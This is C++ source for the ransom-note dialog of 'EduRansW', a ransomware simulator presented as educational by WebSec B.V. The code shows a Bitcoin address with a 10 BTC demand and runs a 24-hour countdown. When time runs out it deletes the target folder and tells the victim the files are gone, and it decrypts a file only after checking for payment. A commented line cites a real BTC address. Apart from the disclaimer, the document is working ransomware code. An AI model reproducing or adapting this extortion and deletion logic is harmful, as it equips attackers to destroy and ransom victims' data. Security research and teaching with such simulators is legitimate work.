/*
 * DISCLAIMER:
 * EduRansW (Educational Ransomware Simulator) is developed for educational and research purposes only,
 * to simulate ransomware behavior in a controlled, ethical, and legal environment. It is intended to
 * assist cybersecurity professionals, researchers, and students in understanding, developing, and
 * enhancing offensive security tools and techniques for defensive and educational purposes.
 * By using EduRansW, users commit to ethical and responsible conduct, strictly prohibiting the application
 * of this software for any illegal or malicious activities. Users must comply with all applicable local,
 * national, and international laws regarding the use of security tools and software. WebSec B.V. disclaims
 * all liability for misuse of EduRansW or any damages that may result from its use. The responsibility
 * lies solely with the user to ensure ethical and lawful use of this software.
 *
 * ABOUT THE DEVELOPER:
 * WebSec B.V. specializes in the development of offensive security tools aimed at advancing the field
 * of cybersecurity. Our products are designed for cybersecurity professionals, researchers, and
 * educational institutions seeking to deepen their understanding of security vulnerabilities,
 * exploitation techniques, and defensive strategies. Our commitment is to contribute positively to the
 * cybersecurity community by equipping it with the knowledge and tools necessary to defend against
 * evolving digital threats.
 * Please use our tools responsibly and in accordance with ethical guidelines and legal requirements.
 * For more information, support, or feedback, visit https://websec.nl.
 *
 * COPYRIGHT © WebSec B.V. All rights reserved.
 */

// RansomDlg.cpp : implementation file
//

#include "stdafx.h"
#include "RansWSimulator.h"
#include "RansomDlg.h"
#include "afxdialogex.h"
#include "RansEngine.h"


// RansomDlg dialog

IMPLEMENT_DYNAMIC(RansomDlg, CDialog)

RansomDlg::RansomDlg(CWnd* pParent /*=NULL*/)
	: CDialog(IDD_RANSOMDLG, pParent)
{

}

RansomDlg::RansomDlg(WCHAR* filePath) : CDialog(IDD_RANSOMDLG, NULL)
{
	
	ZeroMemory(m_filePath, 512 * 2);
	lstrcpyW(m_filePath, filePath);
}

RansomDlg::~RansomDlg()
{
}

void RansomDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(RansomDlg, CDialog)
	ON_WM_TIMER()
	ON_BN_CLICKED(IDC_BUTTON_DECRYPT, &RansomDlg::OnBnClickedButtonDecrypt)
END_MESSAGE_MAP()


// RansomDlg message handlers


BOOL RansomDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  Add extra initialization here
	CHAR szBtcAddress[512] = { NULL };

	GetProfileStringA("RansWSimulator", "BTCAddress", "", szBtcAddress, 512);

	SetDlgItemTextA(this->GetSafeHwnd(), IDC_EDIT_BTCADDR, szBtcAddress);
	SetDlgItemTextA(this->GetSafeHwnd(), IDC_EDIT_AMOUNT, "10 BTC");

	SetTimer(1, 1000, NULL);

	return TRUE;  // return TRUE unless you set the focus to a control
				  // EXCEPTION: OCX Property Pages should return FALSE
}



void RansomDlg::OnTimer(UINT_PTR nIDEvent)
{
	// TODO: Add your message handler code here and/or call default
	__time32_t t;
	DWORD countDownTime;
	DWORD startTime;

	CHAR szStartTime[32] = { NULL };
	CHAR szCountDownTime[64] = { NULL };
	CHAR szTargetFolder[512] = { NULL };

	BYTE temp[4];

	if (nIDEvent == 1)
	{
		GetProfileStringA("RansWSimulator", "CountDownTime", "", szStartTime, 512);

		char2hex(szStartTime, lstrlenA(szStartTime), temp);

		startTime = temp[0] << 24 | temp[1] << 16 | temp[2] << 8 | temp[3];

		_time32(&t);

		countDownTime = (t - startTime) % (24 * 3600);
		countDownTime = 24 * 3600 - countDownTime;

		if (countDownTime==0)
		{
			GetProfileStringA("RansWSimulator", "TargetFolder", "", szTargetFolder, 512);
			if (lstrlenA(szTargetFolder) == 0)
				return;

			deleteFolder(szTargetFolder);

			::MessageBoxA(NULL, "Your personal files were permanently deleted!", "EduRansW", MB_OK);

			EndDialog(0);
		}
		else
		{
			sprintf_s(szCountDownTime, "Time left : %02dh : %02dm : %02ds", (countDownTime / 3600) % 24, (countDownTime / 60) % 60, countDownTime % 60);

			SetDlgItemTextA(this->GetSafeHwnd(), IDC_STATIC_TIME, szCountDownTime);
		}

	}
	CDialog::OnTimer(nIDEvent);
}


void RansomDlg::OnBnClickedButtonDecrypt()
{
	// TODO: Add your control notification handler code here
	BOOL isVerified = FALSE;
	CHAR filePath[512] = { NULL };
	BYTE sessionKey[32] = { NULL };
	CHAR szBtcAddress[512] = { NULL };

	GetProfileStringA("RansWSimulator", "BTCAddress", "", szBtcAddress, 512);

	//lstrcpyA(szBtcAddress, "38DGj87axzmQiZeAd1w1y5FEmuu5a7pfBa");//really existing address

	BeginWaitCursor();

	isVerified = verifyPayment(szBtcAddress);

	EndWaitCursor();

	if (isVerified)
	{
		if (!getProfileWithEncrypt("RansWSimulator", "SessionKey", sessionKey))
		{
			::MessageBoxA(NULL, "Could not find session key", "EduRansW", MB_ICONERROR);
			return;
		}

		WideCharToMultiByte(3, 0, m_filePath, lstrlenW(m_filePath), filePath, lstrlenW(m_filePath), 0, 0);

		if (decryptFile(filePath, sessionKey))
		{
			::MessageBoxA(NULL, "Successfully decrypted! You can open it. Try it.", "EduRansW", MB_OK);
		}
	}
	else
	{
		::MessageBoxA(NULL, "Amount Received : 0\nConfirmations      : 0", "Error : Amount is not yet 10 BTC", MB_ICONERROR);
	}
}

